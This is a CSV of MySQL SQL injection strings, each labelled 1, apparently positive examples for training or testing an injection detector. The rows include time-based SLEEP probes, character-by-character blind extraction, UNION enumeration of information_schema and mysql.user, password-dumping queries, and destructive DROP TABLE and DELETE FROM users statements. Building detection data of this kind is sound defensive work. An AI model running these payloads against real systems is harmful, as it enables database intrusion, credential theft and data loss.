entry,label
1' AND (SELECT COUNT(*) FROM information_schema.tables) > 10 --,1
' OR SLEEP(10) --,1
"' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 68 --",1
"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables LIMIT 1 --",1
' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --,1
' OR (SELECT 1 WHERE 1=1) --,1
' AND (SELECT version()) LIKE '5%' --,1
' OR 1=1 ORDER BY 1 --,1
"' OR ascii(substring((select database()),1,1)) = 109 --",1
"' UNION ALL SELECT NULL, NULL, @@version --",1
' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database()) --,1
' OR (SELECT NULL) IS NULL --,1
' OR (SELECT database()) = 'test' --,1
' OR SLEEP(5) AND '1'='1' --,1
' OR EXISTS(SELECT 1 FROM information_schema.tables) --,1
' UNION ALL SELECT table_name FROM information_schema.tables --,1
"' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) = 53 --",1
"' OR EXTRACTVALUE(1, CONCAT(CHAR(33), version())) --",1
' OR SLEEP(5) AND 'a'='a' --,1
' AND (SELECT version()) LIKE '5.7%' --,1
' OR EXISTS(SELECT * FROM mysql.user) --,1
"' UNION ALL SELECT NULL, NULL FROM mysql.db --",1
"' AND ascii(substring((select @@version),1,1)) = 52 --",1
' OR SLEEP(2) --,1
' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users') --,1
"' UNION ALL SELECT table_name, NULL FROM information_schema.tables --",1
"' AND ascii(substring((select database()),1,1)) = 116 --",1
' OR EXISTS(SELECT 1 FROM users) --,1
"' UNION SELECT NULL, NULL, NULL FROM users --",1
' OR (SELECT 1 FROM information_schema.tables WHERE table_schema='mysql') --,1
' OR 1=1 AND SLEEP(3) --,1
"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema=database() --",1
' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users') --,1
' OR 1=1 AND SLEEP(1) --,1
"' OR 1=1 UNION SELECT NULL, NULL, NULL --",1
1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 1 --,1
"' UNION ALL SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = database() --",1
' OR 1 GROUP BY column_names HAVING 1=1 --,1
"' AND ascii(substring((SELECT @@version), 2, 1)) = 53 --",1
' OR EXISTS(SELECT 1 FROM mysql.user WHERE user = 'admin') --,1
"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_name = 'users' --",1
' AND (SELECT COUNT(*) FROM mysql.db) = 10 --,1
' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'users') > 0 --,1
1; DROP TABLE IF EXISTS users; --,1
' OR (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) IS NOT NULL --,1
' AND (SELECT COUNT(*) FROM mysql.user WHERE user='admin') > 0 --,1
"' OR 1=1 UNION ALL SELECT NULL, NULL FROM mysql.db --",1
' OR SLEEP(0.1) --,1
"' AND ascii(substr((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) = 117 --",1
"' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database() --",1
' OR (SELECT NULL) IS NOT NULL --,1
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 --,1
' OR (SELECT COUNT(*) FROM mysql.user WHERE user='root') > 0 --,1
"' UNION SELECT NULL, NULL, NULL FROM mysql.db --",1
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database()) > 0 --,1
"' AND (SELECT ascii(substring((SELECT version()),2,1))) = 53 --",1
' OR SLEEP(2) AND '1'='1' --,1
"' UNION ALL SELECT NULL, NULL, NULL --",1
' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='mysql') --,1
"1' UNION SELECT NULL, version(), NULL --",1
' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='mysql') > 0 --,1
' OR 1=1 AND SLEEP(3) --,1
' AND (SELECT COUNT(*) FROM mysql.db WHERE db='test') > 0 --,1
"' UNION ALL SELECT NULL, NULL FROM information_schema.columns WHERE table_schema='mysql' --",1
"' UNION SELECT NULL, NULL, NULL FROM users --",1
' OR EXISTS(SELECT * FROM information_schema.columns WHERE table_schema='mysql') --,1
"' UNION ALL SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='mysql' --",1
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test') > 0 --,1
' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='test') > 0 --,1
"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema='mysql' --",1
' OR EXISTS(SELECT 1 FROM mysql.user WHERE user='test') --,1
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test') > 0 --,1
"' UNION ALL SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='test' --",1
' OR 1=1 AND SLEEP(4) --,1
' OR (SELECT NULL) IS NULL --,1
' AND (SELECT COUNT(*) FROM mysql.db WHERE db='test') > 0 --,1
"' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema='mysql' --",1
"' AND (SELECT ascii(substr((SELECT table_name FROM information_schema.tables LIMIT 1), 2, 1))) = 105 --",1
' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database()) > 0 --,1
"' UNION SELECT NULL, version(), table_name FROM information_schema.tables WHERE table_schema=database() --",1
' OR EXISTS(SELECT * FROM mysql.user WHERE user='root') --,1
SELECT * FROM users WHERE name='John' OR 1=1 --,1
1; UNION SELECT password FROM users WHERE username='admin' --,1
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='accounts') > 0 --,1
' OR (SELECT NULL FROM mysql.db LIMIT 1) IS NULL --,1
' OR EXISTS(SELECT 1 FROM dual WHERE database()='test' AND version() LIKE '5%') --,1
SELECT * FROM products WHERE id='1' OR 'a'='a' --,1
"' UNION SELECT null, username, password FROM admin --",1
' AND (SELECT COUNT(*) FROM mysql.user) = 5 --,1
"' AND ascii(substring((SELECT password FROM users WHERE id=1), 1, 1)) = 65 --",1
"' UNION SELECT null, version(), database() --",1
' OR (SELECT COUNT(*) FROM accounts WHERE account_status='active') > 0 --,1
"1' UNION ALL SELECT null, user() --",1
' OR SLEEP(5) --,1
' OR (SELECT table_name FROM information_schema.tables LIMIT 1) IS NOT NULL --,1
"' UNION ALL SELECT null, null, null FROM mysql.db --",1
' OR (SELECT COUNT(*) FROM accounts WHERE active='yes') > 0 --,1
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema='mysql' --",1
"' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' --",1
' OR EXISTS(SELECT * FROM dual WHERE 1=1) --,1
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql') > 0 --,1
' OR (SELECT NULL FROM mysql.user WHERE user='admin') IS NOT NULL --,1
' UNION SELECT password FROM users WHERE id=2 --,1
' OR EXISTS(SELECT * FROM mysql.db WHERE db='test') --,1
' OR 1=1 AND SLEEP(10) --,1
"' UNION ALL SELECT version(), user(), database() --",1
"' UNION SELECT null, null, null, table_name FROM information_schema.tables --",1
' OR 1=1; --,1
SELECT * FROM accounts WHERE username='admin' AND 1=1 --,1
1' UNION SELECT table_name FROM information_schema.tables --,1
"' UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name='users' --",1
' OR (SELECT version()) = '5.7.29' --,1
"' UNION ALL SELECT null, null, user() --",1
' AND (SELECT COUNT(*) FROM mysql.user WHERE user='root') = 1 --,1
' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='mysql') > 0 --,1
' OR EXISTS(SELECT * FROM information_schema.columns WHERE table_name='accounts') --,1
"1' UNION ALL SELECT null, null, null FROM mysql.db --",1
' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='mysql' AND table_name='users') --,1
SELECT * FROM users WHERE username='admin' AND password='password' OR 1=1 --,1
' OR SLEEP(1) --,1
' AND (SELECT COUNT(*) FROM mysql.user) > 1 --,1
"' UNION ALL SELECT null, column_name FROM information_schema.columns WHERE table_schema='test' --",1
1' OR (SELECT COUNT(*) FROM mysql.db WHERE db='mysql') > 0 --,1
' AND EXISTS(SELECT * FROM mysql.user WHERE user='test' AND password='test' --,1
' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='test') > 0 --,1
test); DELETE FROM users; --,1
' OR '1'='1,1
